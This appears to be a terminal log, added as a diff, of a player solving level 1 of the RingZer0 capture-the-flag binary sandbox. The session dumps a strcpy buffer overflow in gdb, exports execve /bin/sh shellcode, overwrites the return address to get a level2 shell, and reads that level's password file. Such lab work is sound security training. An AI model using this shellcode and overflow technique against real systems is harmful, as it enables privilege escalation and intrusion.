@@ -1,0 +1,135 @@
+Host 'ringzer0team.com' resolved to 24.37.41.154.
+Connecting to 24.37.41.154:22222...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+Last login: Sat Feb 25 06:59:07 2017 from **
+level1@rzt-bin01:~$ ls
+readme
+level1@rzt-bin01:~$ cat readme 
+Welcom to ringzer0team.com binary sandbox!
+
+For help, come see us on IRC (irc.smashthestack.org #ringzer0team)
+
+Some things you must know:
+  - Levels are in /levels
+  - Home folders are readable only. Create a folder in /tmp to build your exploits.
+  - You can scp files on this box but can't reach internet from it.
+  - Levels passwords are in ~/.pass. Your goal is to reach it to levelup!
+  - Submit your flags on the website!
+
+Enjoy!
+
+level1@rzt-bin01:~$ cd /levels/
+level1@rzt-bin01:/levels$ ls 
+level1  level1.c  level2  level2.c  level3  level3.c  level4  level4.c
+level1@rzt-bin01:/levels$ cat level1.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+    char buf[1024];
+
+    strcpy(buf, argv[1]);
+    return 0;
+}
+level1@rzt-bin01:/levels$ mkdir /tmp/mtux && cp level1 /tmp/mtux && cd /tmp/mtux
+level1@rzt-bin01:/tmp/mtux$ clear
+level1@rzt-bin01:/tmp/mtux$ ls
+level1
+level1@rzt-bin01:/tmp/mtux$ gdb -q ./level1 
+Reading symbols from /tmp/mtux/level1...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804841c <+0>:	push   %ebp
+   0x0804841d <+1>:	mov    %esp,%ebp
+   0x0804841f <+3>:	and    $0xfffffff0,%esp
+   0x08048422 <+6>:	sub    $0x410,%esp
+   0x08048428 <+12>:	mov    0xc(%ebp),%eax
+   0x0804842b <+15>:	add    $0x4,%eax
+   0x0804842e <+18>:	mov    (%eax),%eax
+   0x08048430 <+20>:	mov    %eax,0x4(%esp)
+   0x08048434 <+24>:	lea    0x10(%esp),%eax
+   0x08048438 <+28>:	mov    %eax,(%esp)
+   0x0804843b <+31>:	call   0x8048300 <strcpy@plt>
+   0x08048440 <+36>:	mov    $0x0,%eax
+   0x08048445 <+41>:	leave  
+   0x08048446 <+42>:	ret    
+End of assembler dump.
+(gdb) p 0x410
+$1 = 1040
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi
+Starting program: /tmp/mtux/level1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x69423569 in ?? ()
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 5375] will be killed.
+
+Quit anyway? (y or n) y
+level1@rzt-bin01:/tmp/mtux$ export shellcode=$(python -c 'print "A"*100+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"')
+level1@rzt-bin01:/tmp/mtux$ export
+declare -x HOME="/home/level1"
+declare -x LANG="en_CA.UTF-8"
+declare -x LANGUAGE="en_CA:en"
+declare -x LOGNAME="level1"
+declare -x LS_COLORS="rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
+declare -x MAIL="/var/mail/level1"
+declare -x OLDPWD="/levels"
+declare -x PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+declare -x PWD="/tmp/mtux"
+declare -x SHELL="/bin/bash"
+declare -x SHLVL="1"
+declare -x SSH_CLIENT="** 62298 22"
+declare -x SSH_CONNECTION="** 62298 1.3.3.5 22"
+declare -x SSH_TTY="/dev/pts/1"
+declare -x TERM="xterm"
+declare -x USER="level1"
+declare -x shellcode="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj
+                                                                                                                           XRh//shh/bin⑓⍀"
+level1@rzt-bin01:/tmp/mtux$ nano hack.c
+level1@rzt-bin01:/tmp/mtux$ gcc hack.c -o hack
+level1@rzt-bin01:/tmp/mtux$ ./hack 
+Addres : 0xbfffff05
+level1@rzt-bin01:/tmp/mtux$ ./level1 `python -c "import struct; print 'A'*1036+struct.pack('<I',0xbfffff05)"`
+$ id
+uid=1001(level1) gid=1001(level1) groups=1001(level1),1000(levels)
+$ ^C
+$ exit
+level1@rzt-bin01:/tmp/mtux$ /levels/level1 `python -c "import struct; print 'A'*1036+struct.pack('<I',0xbfffff05)"`
+$ id
+uid=1001(level1) gid=1001(level1) euid=1002(level2) groups=1002(level2),1000(levels),1001(level1)
+$ whoami
+level2
+$ cd /home/
+$ cd level2
+$ ls -la
+total 28
+dr-xr-x---  2 level2 level2 4096 Feb 26  2014 .
+drwxr-xr-x 17 root   root   4096 Oct 22  2014 ..
+-rw-r-----  1 level2 level2  220 Dec 31  2012 .bash_logout
+-rw-r-----  1 level2 level2 3415 Feb 25  2014 .bashrc
+-r--------  1 level2 level2   21 Feb 26  2014 .pass
+-rw-r-----  1 level2 level2  675 Dec 31  2012 .profile
+-rw-r-----  1 level2 level2   19 Feb 26  2014 .vimrc
+$ cat .pass
+TJyK9lJwZrgqc8nIIF6o
+$ exit
+level1@rzt-bin01:/tmp/mtux$ mtucx
